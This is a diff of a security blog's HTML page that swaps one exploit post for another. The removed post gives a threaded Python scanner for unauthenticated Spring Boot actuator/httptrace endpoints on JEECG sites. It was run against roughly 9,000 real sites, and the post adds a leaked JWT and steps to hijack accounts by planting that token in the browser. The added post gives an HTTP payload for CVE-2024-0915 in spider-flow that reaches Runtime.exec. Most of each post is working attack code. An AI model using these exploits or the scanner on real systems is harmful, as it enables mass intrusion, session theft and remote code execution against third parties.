@@ -9,7 +9,7 @@
     
     <title>
         
-            JEECG-CVE-APPLY |
+            spider-flow |
         
         二十八华生的博客
     </title>
@@ -176,7 +176,7 @@
         <div class="article-content-container">
 
             <div class="article-title">
-                <span class="title-hover-animation">JEECG-CVE-APPLY</span>
+                <span class="title-hover-animation">spider-flow</span>
             </div>
 
             
@@ -196,13 +196,13 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2023-10-17 23:54:04</span>
-        <span class="mobile">2023-10-17 23:54</span>
+        <span class="pc">2024-01-13 23:25:21</span>
+        <span class="mobile">2024-01-13 23:25</span>
     </span>
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-10-18 00:43:06</span>
+        <span class="pc">2024-01-13 23:32:32</span>
     </span>
     
     
@@ -211,12 +211,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>573 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>86 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
         </span>
     
     
@@ -233,37 +233,19 @@
 
             <div class="article-content keep-markdown-body">
                 <blockquote>
-<p>JEECG-CVE-APPLY</p>
+<p>spider-flow</p>
 </blockquote>
 <span id="more"></span>
 
-<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>​    There is an unauthorized access vulnerability in the actuator/httptrace backend of Spring Boot, which leads to the leakage of the token of the login account. We can directly use the leaked token to log in to the backend without a password and a username.</p>
-<h1 id="Utilization-process"><a href="#Utilization-process" class="headerlink" title="Utilization process"></a>Utilization process</h1><p>​    First we have to find the site where the jeecg project has been deployed and it has the problem of unauthorized access to actuator/httptrace. Fortunately, it is leaked by default!</p>
-<p>​    I used fofa to collect nearly 9,000 related sites, and then used the following python program to help me screen sites with vulnerabilities.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用不安全请求警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url1 = url + <span class="string">&#x27;/actuator/httptrace&#x27;</span></span><br><span class="line">        url2 = url + <span class="string">&#x27;/jeecg-boot/actuator/httptrace&#x27;</span></span><br><span class="line">        url3 = url + <span class="string">&#x27;/api/actuator/httptrace&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url1,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;x-access-token&quot;:[&quot;ey&#x27;</span> <span class="keyword">in</span> res.text.lower() :</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;get.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(<span class="string">f&#x27;<span class="subst">&#123;url1&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        res = requests.get(url2,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;x-access-token&quot;:[&quot;ey&#x27;</span> <span class="keyword">in</span> res.text.lower() :</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;get.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(<span class="string">f&#x27;<span class="subst">&#123;url2&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        res = requests.get(url3,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;x-access-token&quot;:[&quot;ey&#x27;</span> <span class="keyword">in</span> res.text.lower() :</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;get.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(<span class="string">f&#x27;<span class="subst">&#123;url3&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_url</span>(<span class="params">url, num</span>):</span><br><span class="line">    <span class="keyword">if</span> exp(url):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;num&#125;</span>条成功记录: <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;target.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        urls = [i.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f]</span><br><span class="line"></span><br><span class="line">    num_threads = <span class="number">10</span>  </span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(urls), num_threads):</span><br><span class="line">        batch = urls[i:i + num_threads]</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> batch:</span><br><span class="line">            t = threading.Thread(target=test_url, args=(url, num))</span><br><span class="line">            t.start()</span><br><span class="line">            threads.append(t)</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<p>​    Then I discovered that about 1 in 10 sites had this vulnerability.</p>
-<p><img lazyload alt="image" data-src="1.png"></p>
-<p>​    Next we will use the token to log in directly regardless of the user name and password.</p>
-<p>​    Here I recommend using firefox because it can beautify json format data and facilitate data review.</p>
-<p><img lazyload alt="image" data-src="2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTE1NzIwODMsInVzZXJuYW1lIjoiZGVtbyJ9.2VG3rGXqzZ7se4T3z1UBtbJz_zWpiN25FUb0dP1pItA</span><br></pre></td></tr></table></figure>
 
-<p>​    Then we visit the login system page, that is, directly delete jeecg-boot/actuator/httptrace, which is the background system address.</p>
-<p>​    Then we open the browser developer tools and select the local storage space of the application bar.</p>
-<p><img lazyload alt="image" data-src="3.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro__Access-Token</span><br></pre></td></tr></table></figure>
+<p>First create a function capable of RCE using the following exploit method for CVE-2024-0915.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/function/save</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8088</span><br><span class="line"></span><br><span class="line"><span class="language-sas">id=<span class="variable">&amp;name</span>=rce<span class="variable">&amp;parameter</span>=rce<span class="variable">&amp;script</span>=&#125;Java.type(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRun<span class="meta">time</span>().exec(<span class="string">&#x27;calc&#x27;</span>);&#123;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTE1NzIwODMsInVzZXJuYW1lIjoiZGVtbyJ9.2VG3rGXqzZ7se4T3z1UBtbJz_zWpiN25FUb0dP1pItA&quot;,&quot;expire&quot;:null&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    Then add a row of data with the key <code>pro__Access-Token</code> and the value <code>&#123;&quot;value&quot;:&quot;token&quot;,&quot;expire&quot;:null&#125;</code>. The value of the token here is the token we just obtained from httptrace.</p>
-<p>​    As shown below:</p>
-<p><img lazyload alt="image" data-src="4.png"></p>
-<p>​    Then refresh the page and we will log in to the account of the token owner.</p>
-<p><img lazyload alt="image" data-src="5.png"></p>
-<p>​    Please note that this exploit requires the validity of the token. We try to select a token that is closer to our current time. Otherwise, it is more likely that the login token will become invalid.</p>
-<p>​    Thanks for Reading!</p>
-<p>​    THX again!</p>
+<p><img lazyload alt="image" data-src="cve-2024-0915.gif"></p>
+<p>It is recommended to send the payload several times more</p>
+<p>Then we delete this function on the front end and find that the payload is still executed.</p>
+<p><img lazyload alt="image" data-src="cve-2.gif"></p>
 
             </div>
 
@@ -272,16 +254,16 @@
                     <div class="article-copyright-info-container">
     <ul class="copyright-info-content">
         <li>
-            <span class="type">本文标题</span>：<span class="content">JEECG-CVE-APPLY</span>
+            <span class="type">本文标题</span>：<span class="content">spider-flow</span>
         </li>
         <li>
             <span class="type">本文作者</span>：<span class="content">二十八华生</span>
         </li>
         <li>
-            <span class="type">创建时间</span>：<span class="content">2023-10-17 23:54:04</span>
+            <span class="type">创建时间</span>：<span class="content">2024-01-13 23:25:21</span>
         </li>
         <li class="post-link">
-            <span class="type">本文链接</span>：<span class="content">2023/10/17/JEECG-CVE-APPLY/</span>
+            <span class="type">本文链接</span>：<span class="content">2024/01/13/spider-flow/</span>
         </li>
         <li>
             <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
@@ -297,29 +279,14 @@
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                               rel="prev"
-                               href="/2023/10/18/EDUSRC-%E4%B8%80-%EF%BC%9A%E6%9F%90985%E8%AF%81%E4%B9%A6%E7%AB%99%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/"
-                            >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                                <span class="title flex-center">
-                                <span class="post-nav-title-item">EDUSRC(一)：某985证书站挖掘记录</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                            </a>
-                        </div>
-                    
                     
                         <div class="article-next">
                             <a class="next"
                                rel="next"
-                               href="/2023/07/12/Upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"
+                               href="/2023/10/18/EDUSRC-%E4%B8%80-%EF%BC%9A%E6%9F%90985%E8%AF%81%E4%B9%A6%E7%AB%99%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/"
                             >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">Upload-labs靶场学习记录</span>
+                                <span class="post-nav-title-item">EDUSRC(一)：某985证书站挖掘记录</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                                 <span class="right arrow-icon flex-center">
@@ -338,7 +305,7 @@
             <div class="toc-content-container">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Utilization-process"><span class="nav-text">Utilization process</span></a></li></ol>
+        
     </div>
 </div>
 
@@ -362,7 +329,7 @@
             
                 <span>2023</span> -
             
-            2023
+            2024
             
                 &nbsp;<i class="fas fa-heart icon-animate"></i>
                 &nbsp;<a href="/">二十八华生</a>
